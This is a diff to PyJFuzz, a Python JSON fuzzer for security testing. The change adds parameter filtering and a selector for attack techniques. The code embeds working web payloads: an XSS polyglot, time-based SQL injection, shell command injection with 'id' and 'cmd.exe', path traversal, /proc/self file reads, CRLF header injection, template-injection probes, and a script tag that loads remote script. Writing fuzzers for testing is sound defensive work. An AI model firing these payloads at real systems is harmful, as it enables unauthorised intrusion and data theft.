@@ -36,7 +36,7 @@ import urllib
 import sys
 import argparse
 
-__version__ = 0.1
+__version__ = 0.2
 __author__ = "Daniele 'dzonerzy' Linguaglossa"
 __mail__ = "danielelinguaglossa@gmail.com"
 
@@ -45,8 +45,20 @@ class JSONFactory:
     fuzz_factor = None
     was_array = None
     is_fuzzed = None
+    params = None
+    techniques = {
+        "C": [10, 5],
+        "H": [9],
+        "P": [6, 2],
+        "T": [11, 12],
+        "S": [3, 1],
+        "X": [0, 4, 7, 8]
+    }
+    tech = []
 
-    def __init__(self):
+    def __init__(self, techniques=None, params=None):
+        self.params = params.split(",") if params is not None else params
+        self.tech = list(techniques) if techniques is not None else []
         self.fuzz_factor = 0
         self.is_fuzzed = False
         self.was_array = False
@@ -54,11 +66,13 @@ class JSONFactory:
             ver = subprocess.Popen(["radamsa", "-V"], stdout=subprocess.PIPE).communicate()[0]
             sys.stderr.write("[INFO] Using ({0})\n\n".format(ver.strip("\n")))
         except OSError:
-            sys.stderr.write("[ERROR] Radamsa was not found, Please install it!\n\n")
-            sys.exit(-1)
+            raise OSError("Radamsa was not found, Please install it!\n\n")
 
     def initWithJSON(self, json_obj):
         fuzz_factor = self.fuzz_factor
+        params = self.params
+        tech = self.tech
+        techniques = self.techniques
         try:
             self.__dict__ = json.loads(json_obj)
         except TypeError:
@@ -66,8 +80,15 @@ class JSONFactory:
             self.was_array = True
         except ValueError:
             self.__dict__ = {"dummy": "dummy"}
+        self.params = params
         self.fuzz_factor = fuzz_factor
         self.is_fuzzed = False
+        self.techniques = techniques
+        if len(tech) != 0:
+            for t in tech:
+                if t in self.techniques.keys():
+                    self.tech += self.techniques[t]
+        self.__dict__.update({"tech": self.tech})
 
     def ffactor(self, factor):
         if factor not in range(0, 7):
@@ -93,26 +114,32 @@ class JSONFactory:
         if self.is_fuzzed:
             raise ValueError("You cannot fuzz an already fuzzed object please call 'initWithJSON'")
         for element in elements.keys():
-            if element in ["fuzz_factor", "was_array", "is_fuzzed"]:
+            if element in ["fuzz_factor", "was_array", "is_fuzzed", "params", "techniques", "tech"]:
                 pass
             else:
-                if type(elements[element]) == dict:
-                    self.fuzz_elements(elements[element], factor)
-                elif type(elements[element]) == list:
-                    elements[element] = self.fuzz_array(elements[element], factor)
-                elif type(elements[element]) == int:
-                    elements[element] = self.fuzz_int(elements[element], factor)
-                elif type(elements[element]) == bool:
-                    elements[element] = self.fuzz_bool(elements[element], factor)
-                elif type(elements[element]) == unicode:
-                    elements[element] = self.fuzz_string(elements[element], factor)
-                elif type(elements[element]) == str:
-                    elements[element] = self.fuzz_string(elements[element], factor)
-                elif elements[element] is None:
-                    elements[element] = self.fuzz_null(factor)
+                if self.params is not None and element not in self.params:
+                    pass
+                else:
+                    if type(elements[element]) == dict:
+                        self.fuzz_elements(elements[element], factor)
+                    elif type(elements[element]) == list:
+                        elements[element] = self.fuzz_array(elements[element], factor)
+                    elif type(elements[element]) == int:
+                        elements[element] = self.fuzz_int(elements[element], factor)
+                    elif type(elements[element]) == bool:
+                        elements[element] = self.fuzz_bool(elements[element], factor)
+                    elif type(elements[element]) == unicode:
+                        elements[element] = self.fuzz_string(elements[element], factor)
+                    elif type(elements[element]) == str:
+                        elements[element] = self.fuzz_string(elements[element], factor)
+                    elif elements[element] is None:
+                        elements[element] = self.fuzz_null(factor)
         result = dict(self.__dict__)
         del result["fuzz_factor"]
         del result["is_fuzzed"]
+        del result["params"]
+        del result["techniques"]
+        del result["tech"]
         if self.was_array:
             del result["was_array"]
             return result["array"]
@@ -206,7 +233,7 @@ class JSONFactory:
         encoding = lambda x: "\\u00%02x;" % ord(x)
 
         attacks = {
-            0: "jaVasCript:/*-/*\\u00e2/*\\\\u00e2/*'/*\"/**/(/* */oNcliCk=alert() )//%%0D%%0A%%0d%%0a//</stYle/</titLe/</teXtarEa/"
+            0: "jaVasCript:/*-/*\\u0060/*\\\\u0060/*'/*\"/**/(/* */oNcliCk=alert() )//%%0D%%0A%%0d%%0a//</stYle/</titLe/</teXtarEa/"
                "</scRipt/--!>\\u003csVg/<sVg/oNloAd=alert(\%s\)//>\\u003e",
             1: "SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR"
                "(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)"
@@ -215,16 +242,19 @@ class JSONFactory:
             3: "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/%s",
             4: "</script><svg/onload='+/\"/+/onmouseover=1/+(s=document.createElement(/script/.source),"
                "s.stack=Error().stack,s.src=(/,/+/%s.net/).slice(2),document.documentElement.appendChild(s))//'>",
-            5: "%s&sleep 5&id'\\\"\\u00e20&sleep 5&id\\u00e2'",
+            5: "%s&sleep 5&id'\\\"\\u00600&sleep 5&id\\u0060'",
             6: "..\\..\\..\\..\\%s.ini",
             7: "data:text/html,https://%s:a.it@www.\\it",
             8: "file:///proc/self/%s",
             9: "\\u000d\\u00a0BB: %s@mail.it\\u000d\\u000aLocation: www.google.it",
-            10: "||calc.exe&&id||%s",
+            10: "||cmd.exe&&id||%s",
             11: "${7*7}a{{%s}}b",
             12: "{{'%s'*7}}",
         }
-        attack = attacks[random.randint(0, 12)]
+        if len(self.tech) == 0:
+            attack = attacks[random.randint(0, 12)]
+        else:
+            attack = attacks[random.choice(self.tech)]
         to_fuzz = attack % to_fuzz
         p1 = subprocess.Popen(['/bin/echo', to_fuzz], stdout=subprocess.PIPE)
         p2 = subprocess.Popen(["radamsa"], stdin=p1.stdout, stdout=subprocess.PIPE)
@@ -237,13 +267,22 @@ class JSONFactory:
 
 if __name__ == "__main__":
     sys.stderr.write("PyJFuzz v{0} - {1} - {2}\n".format(__version__, __author__, __mail__))
-    parser = argparse.ArgumentParser(description='Trivial Python JSON Fuzzer (c) DZONERZY')
+    parser = argparse.ArgumentParser(description='Trivial Python JSON Fuzzer (c) DZONERZY',
+                                     formatter_class=argparse.RawTextHelpFormatter)
     parser.add_argument('-j', metavar='JSON', help='Original JSON serialized object', required=True)
+    parser.add_argument('-p', metavar='PARAMS', help='Parameters comma separated', required=False, default=None)
+    parser.add_argument('-t', metavar='TECHNIQUES', help='Techniques "CHPTSX"\n\n'
+                                                         'C - Command Execution\n'
+                                                         'H - Header Injection\n'
+                                                         'P - Path Traversal\n'
+                                                         'T - Template Injection\n'
+                                                         'S - SQLInjection\n'
+                                                         'X - XSS\n\n', required=False, default=None)
     parser.add_argument('-f', metavar='FUZZ_FACTOR', help='Fuzz factor [0-6]', type=int, default=6, required=False)
     parser.add_argument('-i', metavar='INDENT', help='JSON indent number', type=int, default=0, required=False)
     parser.add_argument('-ue', action='store_true', help='URLEncode result', dest='ue', default=False, required=False)
     args = parser.parse_args()
-    obj = JSONFactory()
+    obj = JSONFactory(args.t, args.p)
     obj.initWithJSON(args.j)
     obj.ffactor(args.f)
     if args.ue:
